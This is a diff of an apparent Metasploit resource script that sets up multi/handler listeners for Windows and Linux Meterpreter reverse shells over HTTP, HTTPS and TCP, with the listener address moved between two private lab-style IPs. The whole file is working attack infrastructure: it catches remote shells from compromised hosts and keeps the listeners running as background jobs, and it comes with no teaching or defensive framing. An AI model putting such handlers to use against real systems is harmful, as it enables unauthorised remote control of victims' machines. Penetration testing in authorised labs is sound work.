@@ -8,7 +8,7 @@ use multi/handler
 unset PAYLOAD
 set PAYLOAD windows/meterpreter/reverse_http
 set LPORT 8080
-set LHOST 10.0.2.15
+set LHOST 192.168.56.10
 set ExitOnSession false
 set ExitNoSessions false
 set SessionCommunicationTimeout 10
@@ -22,7 +22,7 @@ use multi/handler
 unset PAYLOAD
 set PAYLOAD windows/meterpreter/reverse_https
 set LPORT 8443
-set LHOST 10.0.2.15
+set LHOST 192.168.56.10
 set ExitOnSession false
 set ExitNoSessions false
 set SessionCommunicationTimeout 10
@@ -35,7 +35,7 @@ use multi/handler
 unset PAYLOAD
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
 set LPORT 4444
-set LHOST 10.0.2.15
+set LHOST 192.168.56.10
 set ExitOnSession false
 set ExitNoSessions false
 exploit -j -z
